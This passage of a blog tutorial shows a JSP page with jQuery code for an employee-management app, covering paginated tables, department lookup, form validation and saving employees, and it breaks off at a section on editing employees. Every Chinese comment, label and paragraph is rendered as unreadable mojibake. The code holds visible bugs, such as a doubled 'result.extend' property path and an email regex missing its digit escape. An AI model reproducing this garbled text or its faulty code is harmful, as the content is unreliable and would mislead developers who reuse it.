class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    var totalRecords;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //å»é¦–é¡µ</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºtable</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             ç¼–è¾‘</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             åˆ é™¤</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">        totalRecords = result.extend.pageInfo.total;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©º</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ¸…ç©ºè¡¨å•æ ·å¼åŠå†…å®¹</span></span><br><span class="line"><span class="xml">    function reset_form(ele)&#123;</span></span><br><span class="line"><span class="xml">        $(ele)[0].reset();</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºæ ·å¼</span></span><br><span class="line"><span class="xml">        $(ele).find("*").removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).find(".help-block").text("");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»æ–°å¢æŒ‰é’®å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…é™¤æ•°æ®ï¼Œè¡¨å•é‡ç½®</span></span><br><span class="line"><span class="xml">        reset_form($("#empAddModal form"));</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚ï¼ŒæŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œæ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨</span></span><br><span class="line"><span class="xml">        getDepts();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æŸ¥å‡ºæ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">    function getDepts() &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //æ˜¾ç¤ºéƒ¨é—¨ä¿¡æ¯åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo("#dept_add_select")</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ ¡éªŒè¡¨å•æ•°æ®</span></span><br><span class="line"><span class="xml">    function validata_add_form()&#123;</span></span><br><span class="line"><span class="xml">        //1. æ‹¿åˆ°è¦æ£€éªŒçš„æ•°æ®ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="xml">        var empName = $("#empName_add_input").val();</span></span><br><span class="line"><span class="xml">        var regName = /(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/;</span></span><br><span class="line"><span class="xml">        if(!regName.test(empName))&#123;</span></span><br><span class="line"><span class="xml">            // alert("ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line"><span class="xml">            //æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","error","ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2. æ ¡éªŒé‚®ç®±ä¿¡æ¯</span></span><br><span class="line"><span class="xml">        var email = $("#email_add_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","error","é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        return true;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ˜¾ç¤ºæ ¡éªŒä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function show_validate_msg(ele,status,msg)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line"><span class="xml">        $(ele).parent().removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).next("span").text("");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        if(status == "success")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-success");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;else if(status == "error")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-error");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="xml">    $("#empName_add_input").change(function () &#123;</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="xml">        var empName = this.value;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/checkUser",</span></span><br><span class="line"><span class="xml">            data:"empName="+empName,</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","success","ç”¨æˆ·åå¯ç”¨");</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","success");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","error",result.extend.va_msg);</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","error");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»ä¿å­˜ï¼Œä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="xml">    $("#emp_save_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line"><span class="xml">        //2.å…ˆå¯¹è¦æäº¤ç»™æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line"><span class="xml">        if(!validata_add_form())&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //3.åˆ¤æ–­ä¹‹å‰çš„ajaxç”¨æˆ·åæ ¡éªŒæ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="xml">        if($(this).attr("ajax-va")=="error")&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //4.å‘é€ajaxè¯·æ±‚ä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="xml">        // alert($("#empAddModal form").serialize());</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp",</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            data:$("#empAddModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    //å‘˜å·¥ä¿å­˜æˆåŠŸï¼š</span></span><br><span class="line"><span class="xml">                    //1. å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">                    $("#empAddModal").modal('hide');</span></span><br><span class="line"><span class="xml">                    //2. æ¥åˆ°æœ€åä¸€é¡µï¼Œæ˜¾ç¤ºåˆšæ‰ä¿å­˜çš„æ•°æ®</span></span><br><span class="line"><span class="xml">                    //å‘é€ajaxè¯·æ±‚æ˜¾ç¤ºæœ€åä¸€é¡µæ•°æ®å³å¯</span></span><br><span class="line"><span class="xml">                    //å¯ä»¥å°†æ€»è®°å½•æ•°å½“ä½œé¡µç </span></span><br><span class="line"><span class="xml">                    to_page(totalRecords);</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    //æ˜¾ç¤ºå¤±è´¥ä¿¡æ¯</span></span><br><span class="line"><span class="xml">                    // console.log(result);</span></span><br><span class="line"><span class="xml">                    //æœ‰å“ªä¸ªå­—æ®µçš„é”™è¯¯ä¿¡æ¯ï¼Œå°±æ˜¾ç¤ºå“ªä¸ªå­—æ®µ</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.email)&#123;</span></span><br><span class="line"><span class="xml">                        //æ˜¾ç¤ºé‚®ç®±é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#email_add_input","error",result.extend.errorFields.email);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.empName)&#123;</span></span><br><span class="line"><span class="xml">                        //æ˜¾ç¤ºå‘˜å·¥é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#empName_add_input","error",result.extend.result.extend.errorFields.empName);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h1 id="å‘˜å·¥ä¿®æ”¹"><a href="#å‘˜å·¥ä¿®æ”¹" class="headerlink" title="å‘˜å·¥ä¿®æ”¹"></a>å‘˜å·¥ä¿®æ”¹</h1><p>æ•ˆæœå›¾ï¼š<br><img src="/img/JavaWeb/10-19å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><p>å½“ç‚¹å‡»ç¼–è¾‘æŒ‰é’®æ—¶å°±ä¼šå¼¹å‡ºè¿™æ ·ä¸€ä¸ªæ¨¡æ€æ¡†</p><ol><li><p>ç‚¹å‡»ç¼–è¾‘</p></li><li><p>å¼¹å‡ºç”¨æˆ·ä¿®æ”¹çš„æ¨¡æ€æ¡†ï¼ˆæ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ï¼‰</p></li><li><p>ç‚¹å‡»æ›´æ–°ï¼Œå®Œæˆç”¨æˆ·ä¿®æ”¹</p></li></ol><p>ç”±äºå¾ˆç›¸ä¼¼ï¼Œæ‰€ä»¥å°±å¤åˆ¶è¿›è¡Œä¸€ç‚¹ä¿®æ”¹å°±å¥½äº†</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 